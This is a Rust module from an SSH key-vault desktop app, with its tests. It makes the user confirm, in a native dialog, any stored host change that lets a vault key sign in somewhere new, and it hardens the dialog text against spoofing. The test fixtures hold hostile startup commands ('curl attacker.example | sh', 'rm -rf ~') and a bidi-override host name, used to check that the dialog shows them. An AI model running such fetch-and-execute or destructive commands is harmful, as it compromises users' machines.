//! Native confirmation for host and identity writes that let a vault key sign
//! in somewhere new.
//!
//! The page writes the store, and a saved host that signs in with a vault key
//! is a standing permission: use this key, as this account, against this
//! address, and run this command there. The first connection to an address
//! trusts whatever server answers, so a permission the page wrote on its own
//! would hand the key's signature and the command to a server of its choosing.
//! A write that grants a permission no saved host holds yet is therefore
//! confirmed in the same OS-drawn dialog `host_key_prompt` shows, which a
//! script can neither read nor answer.
//!
//! What the dialog lists is worked out here from the store as it would stand
//! after the write, and a key is named from the vault's own metadata, so the
//! page never supplies a description of its own change. Writes that grant
//! nothing new go through without a question: renames, tags, groups, password
//! hosts, and any edit that leaves every host's key reach where it was.
//!
//! This guards against a page acting without the user, not against the user.
//! Whoever clicks Allow has allowed it.

use crate::host_key_prompt::{self, PromptGate};
use clavyn_core::key_reach::{self, NewReach};
use clavyn_core::keys::KeyMeta;
use clavyn_core::store::{Store, StoreData};
use tauri::AppHandle;
use tokio::sync::Mutex;
use uuid::Uuid;

/// Marks the error raised when the user answered the dialog with Cancel, so a
/// form can say the change was not saved without reporting it as a failure.
pub const DECLINED: &str = "[host-change-confirmation-declined]";

const TITLE: &str = "Allow a vault key to be used";

/// Hosts listed by name before the rest are counted. An identity shared by
/// many hosts would otherwise produce a dialog taller than the screen, with
/// the buttons pushed out of reach.
const LISTED_HOSTS: usize = 5;
const LABEL_LIMIT: usize = 64;
const ADDRESS_LIMIT: usize = 255;
const COMMAND_LIMIT: usize = 300;

/// The gate these dialogs share. It is kept apart from the host key gate so a
/// refusal of one kind of question does not silence the other.
pub fn gate() -> PromptGate {
    PromptGate::for_subject("host change", DECLINED)
}

fn preview(store: &Store, edit: &impl Fn(&mut StoreData)) -> Vec<NewReach> {
    let mut after = store.data().clone();
    edit(&mut after);
    key_reach::introduced(store.data(), &after)
}

/// Apply `edit` to the store, asking `confirm` first when the write would let a
/// vault key sign in somewhere new.
///
/// The decision and a write that needs no question happen under one lock, so
/// nothing can slip in between deciding "nothing new" and writing. The lock is
/// not held across the dialog, which can stay open for minutes while the store
/// keeps serving connections; after the answer the write is previewed again
/// against the store as it is then, and refused if it would now allow anything
/// the dialog did not show.
pub async fn write_confirmed<E, F, Fut>(
    store: &Mutex<Store>,
    edit: E,
    confirm: F,
) -> Result<(), String>
where
    E: Fn(&mut StoreData),
    F: FnOnce(Vec<NewReach>) -> Fut,
    Fut: std::future::Future<Output = Result<(), String>>,
{
    let shown = {
        let mut store = store.lock().await;
        let reaches = preview(&store, &edit);
        if reaches.is_empty() {
            return store.commit(&edit).map_err(|e| e.to_string());
        }
        reaches
    };
    confirm(shown.clone()).await?;
    let mut store = store.lock().await;
    if !preview(&store, &edit).iter().all(|now| shown.contains(now)) {
        return Err(
            "the saved hosts changed while the confirmation was open; save again to review the \
             change"
                .to_string(),
        );
    }
    store.commit(&edit).map_err(|e| e.to_string())
}

/// Ask the user, in a native dialog, to allow `reaches`. `keys` is the vault's
/// key metadata, or `None` while the vault is locked.
pub async fn confirm(
    app: &AppHandle,
    gate: &PromptGate,
    reaches: &[NewReach],
    keys: Option<&[KeyMeta]>,
) -> Result<(), String> {
    host_key_prompt::confirm(app, gate, TITLE, &message(reaches, keys), "Allow").await
}

/// The dialog text for `reaches`.
pub fn message(reaches: &[NewReach], keys: Option<&[KeyMeta]>) -> String {
    let mut text = String::from(
        "This change lets a key from your vault sign in where no saved host lets it sign in \
         now:\n",
    );
    for new in reaches.iter().take(LISTED_HOSTS) {
        let reach = &new.reach;
        text.push_str(&format!(
            "\n{}\n    {}@{}:{}\n    Key: {}\n",
            shown(&new.host_label, LABEL_LIMIT),
            shown(&reach.username, LABEL_LIMIT),
            address(&reach.hostname),
            reach.port,
            key_name(reach.key_id, keys),
        ));
        if let Some(command) = &reach.startup_command {
            text.push_str(&format!(
                "    Runs on connect: {}\n",
                shown(command, COMMAND_LIMIT)
            ));
        }
    }
    let rest = reaches.len().saturating_sub(LISTED_HOSTS);
    if rest > 0 {
        let hosts = if rest == 1 { "host" } else { "hosts" };
        text.push_str(&format!("\n…and {rest} more {hosts}.\n"));
    }
    let runs = if reaches
        .iter()
        .any(|new| new.reach.startup_command.is_some())
    {
        " and the command runs on it"
    } else {
        ""
    };
    text.push_str(&format!(
        "\nThe first connection to an address trusts whichever server answers there, so the key \
         signs in to that server{runs}. Allow this only if you are making this change yourself."
    ));
    text
}

fn address(hostname: &str) -> String {
    let shown = shown(hostname, ADDRESS_LIMIT);
    if hostname.contains(':') {
        format!("[{shown}]")
    } else {
        shown
    }
}

fn key_name(id: Uuid, keys: Option<&[KeyMeta]>) -> String {
    match keys {
        None => format!("{id} (unlock the vault to see which key this is)"),
        Some(keys) => match keys.iter().find(|key| key.id == id) {
            Some(key) => format!("{} ({})", shown(&key.label, LABEL_LIMIT), key.fingerprint),
            None => format!("{id}, which is not in the vault"),
        },
    }
}

/// Characters that can change how the text around them is laid out or read:
/// zero-width characters, and the marks that reorder bidirectional text.
fn is_layout_mark(c: char) -> bool {
    matches!(
        c,
        '\u{061C}' | '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2060}'..='\u{2069}'
            | '\u{FEFF}'
    )
}

/// Render a stored string for the dialog.
///
/// Every string here was written by the page. Line breaks, control characters
/// and layout marks could redraw the dialog — a label carrying a newline and a
/// reassuring paragraph, say — so they are printed as escapes. A long value is
/// cut with a count of what was left out, so padding cannot push the part that
/// matters out of view without the cut being visible.
fn shown(text: &str, limit: usize) -> String {
    let mut out = String::new();
    for c in text.chars().take(limit) {
        if c.is_control() || is_layout_mark(c) {
            out.extend(c.escape_unicode());
        } else {
            out.push(c);
        }
    }
    let left_out = text.chars().count().saturating_sub(limit);
    if left_out > 0 {
        out.push_str(&format!("… ({left_out} more characters)"));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use clavyn_core::host::{AuthMethod, Host};
    use clavyn_core::identity::Identity;
    use clavyn_core::key_reach::KeyReach;
    use clavyn_core::keys::KeyType;
    use std::sync::atomic::{AtomicUsize, Ordering};

    fn key_host(hostname: &str, key: Uuid) -> Host {
        let mut host = Host::new("prod", hostname, 22, "deploy");
        host.auth = AuthMethod::PublicKey;
        host.key_id = Some(key);
        host
    }

    fn password_host(hostname: &str) -> Host {
        let mut host = Host::new("lab", hostname, 22, "deploy");
        host.auth = AuthMethod::Password {
            credential_key: "default".into(),
        };
        host
    }

    fn new_reach(label: &str, hostname: &str, key: Uuid, command: Option<&str>) -> NewReach {
        NewReach {
            host_id: Uuid::new_v4(),
            host_label: label.into(),
            reach: KeyReach {
                key_id: key,
                username: "deploy".into(),
                hostname: hostname.into(),
                port: 22,
                startup_command: command.map(str::to_owned),
            },
        }
    }

    fn meta(id: Uuid, label: &str) -> KeyMeta {
        KeyMeta {
            id,
            label: label.into(),
            key_type: KeyType::Ed25519,
            fingerprint: "SHA256:fixturefingerprint".into(),
            public_key_base64: String::new(),
        }
    }

    fn store() -> (tempfile::TempDir, std::path::PathBuf, Mutex<Store>) {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("store.json");
        let store = Store::load(path.clone()).expect("load");
        (dir, path, Mutex::new(store))
    }

    #[tokio::test]
    async fn a_write_that_allows_nothing_new_is_saved_without_asking() {
        let (_dir, path, store) = store();
        let host = password_host("lab.example");
        write_confirmed(
            &store,
            |data| data.add_host(host.clone()),
            |_| async { panic!("a password host must not need a confirmation") },
        )
        .await
        .expect("saved");
        assert_eq!(Store::load(path).expect("reload").hosts().len(), 1);
    }

    #[tokio::test]
    async fn a_declined_confirmation_writes_nothing() {
        let (_dir, path, store) = store();
        let key = Uuid::new_v4();
        let host = key_host("attacker.example", key);
        let asked = AtomicUsize::new(0);

        let error = write_confirmed(
            &store,
            |data| data.add_host(host.clone()),
            |reaches| {
                asked.fetch_add(1, Ordering::SeqCst);
                assert_eq!(reaches.len(), 1);
                assert_eq!(reaches[0].reach.hostname, "attacker.example");
                assert_eq!(reaches[0].reach.key_id, key);
                async { Err(format!("{DECLINED} {TITLE}: cancelled")) }
            },
        )
        .await
        .expect_err("a declined write must fail");

        assert!(error.contains(DECLINED), "{error}");
        assert_eq!(asked.load(Ordering::SeqCst), 1);
        assert!(store.lock().await.hosts().is_empty());
        assert!(!path.exists(), "a declined write reached the disk");
    }

    #[tokio::test]
    async fn a_confirmed_write_is_saved() {
        let (_dir, path, store) = store();
        let host = key_host("prod.example", Uuid::new_v4());
        write_confirmed(
            &store,
            |data| data.add_host(host.clone()),
            |_| async { Ok(()) },
        )
        .await
        .expect("saved");
        assert_eq!(Store::load(path).expect("reload").hosts()[0].id, host.id);
    }

    #[tokio::test]
    async fn an_identity_edit_asks_about_every_host_it_would_send_the_key_to() {
        let (_dir, _path, store) = store();
        let identity = Identity::new("ops", "root");
        {
            let mut store = store.lock().await;
            store.add_identity(identity.clone()).expect("identity");
            for hostname in ["web.example", "db.example"] {
                let mut host = password_host(hostname);
                host.identity_id = Some(identity.id);
                store.add_host(host).expect("host");
            }
        }

        let mut keyed = identity.clone();
        keyed.auth = AuthMethod::PublicKey;
        keyed.key_id = Some(Uuid::new_v4());
        let error = write_confirmed(
            &store,
            |data| data.update_identity(keyed.clone()),
            |reaches| {
                let hostnames: Vec<_> = reaches.iter().map(|r| r.reach.hostname.clone()).collect();
                assert_eq!(hostnames, ["web.example", "db.example"]);
                async { Err("declined".to_string()) }
            },
        )
        .await
        .expect_err("declined");
        assert_eq!(error, "declined");
        assert_eq!(
            store.lock().await.identities()[0].auth,
            AuthMethod::Agent,
            "the identity changed although the write was declined"
        );
    }

    #[tokio::test]
    async fn a_write_that_would_allow_more_than_was_shown_is_refused() {
        let (_dir, _path, store) = store();
        let mut identity = Identity::new("ops", "root");
        identity.auth = AuthMethod::PublicKey;
        identity.key_id = Some(Uuid::new_v4());
        let mut first = password_host("web.example");
        first.identity_id = Some(identity.id);
        store.lock().await.add_host(first).expect("host");

        // While the dialog about the first host is open, a second host starts
        // linking the same identity. It was never shown, so the write that
        // would give it the key must not go through.
        let (concurrent, linked) = (&store, identity.id);
        let error = write_confirmed(
            &store,
            |data| data.add_identity(identity.clone()),
            move |reaches| async move {
                assert_eq!(reaches.len(), 1);
                let mut second = password_host("attacker.example");
                second.identity_id = Some(linked);
                concurrent
                    .lock()
                    .await
                    .add_host(second)
                    .expect("concurrent write");
                Ok(())
            },
        )
        .await
        .expect_err("a write broader than the dialog went through");
        assert!(
            error.contains("changed while the confirmation was open"),
            "{error}"
        );
        assert!(store.lock().await.identities().is_empty());
    }

    #[test]
    fn the_message_names_the_destination_key_and_command() {
        let key = Uuid::new_v4();
        let text = message(
            &[new_reach(
                "evil",
                "attacker.example",
                key,
                Some("curl x | sh"),
            )],
            Some(&[meta(key, "work laptop")]),
        );
        assert!(text.contains("evil\n"), "{text}");
        assert!(text.contains("deploy@attacker.example:22"), "{text}");
        assert!(
            text.contains("Key: work laptop (SHA256:fixturefingerprint)"),
            "{text}"
        );
        assert!(text.contains("Runs on connect: curl x | sh"), "{text}");
        assert!(text.contains("the command runs on it"), "{text}");
    }

    #[test]
    fn a_locked_vault_names_the_key_by_id() {
        let key = Uuid::new_v4();
        let text = message(&[new_reach("prod", "prod.example", key, None)], None);
        assert!(
            text.contains(&format!("Key: {key} (unlock the vault")),
            "{text}"
        );
        assert!(!text.contains("Runs on connect"), "{text}");
        assert!(!text.contains("the command runs"), "{text}");

        let other = Uuid::new_v4();
        let text = message(&[new_reach("prod", "prod.example", other, None)], Some(&[]));
        assert!(text.contains("which is not in the vault"), "{text}");
    }

    #[test]
    fn stored_text_cannot_redraw_the_dialog() {
        let key = Uuid::new_v4();
        let text = message(
            &[new_reach(
                "prod\n\nThis is a routine update.",
                "attacker.example\u{202E}",
                key,
                Some("echo hi\nrm -rf ~"),
            )],
            None,
        );
        assert!(
            text.contains("prod\\u{a}\\u{a}This is a routine update."),
            "{text}"
        );
        assert!(text.contains("attacker.example\\u{202e}"), "{text}");
        assert!(text.contains("echo hi\\u{a}rm -rf ~"), "{text}");
    }

    #[test]
    fn a_long_command_is_cut_visibly() {
        let key = Uuid::new_v4();
        let tail = "; curl attacker.example | sh";
        let padded = format!("{}{tail}", " ".repeat(COMMAND_LIMIT));
        let text = message(
            &[new_reach("prod", "prod.example", key, Some(&padded))],
            None,
        );
        let cut = format!("… ({} more characters)", tail.len());
        assert!(text.contains(&cut), "{text}");
    }

    #[test]
    fn a_long_list_is_counted_rather_than_listed() {
        let key = Uuid::new_v4();
        let reaches: Vec<_> = (0..LISTED_HOSTS + 3)
            .map(|i| new_reach(&format!("host {i}"), &format!("h{i}.example"), key, None))
            .collect();
        let text = message(&reaches, None);
        assert!(
            text.contains(&format!("host {}", LISTED_HOSTS - 1)),
            "{text}"
        );
        assert!(!text.contains(&format!("host {LISTED_HOSTS}")), "{text}");
        assert!(text.contains("…and 3 more hosts."), "{text}");
    }

    #[test]
    fn an_ipv6_address_is_bracketed_so_the_port_reads_apart() {
        let key = Uuid::new_v4();
        let text = message(&[new_reach("v6", "2001:db8::1", key, None)], None);
        assert!(text.contains("deploy@[2001:db8::1]:22"), "{text}");
    }
}
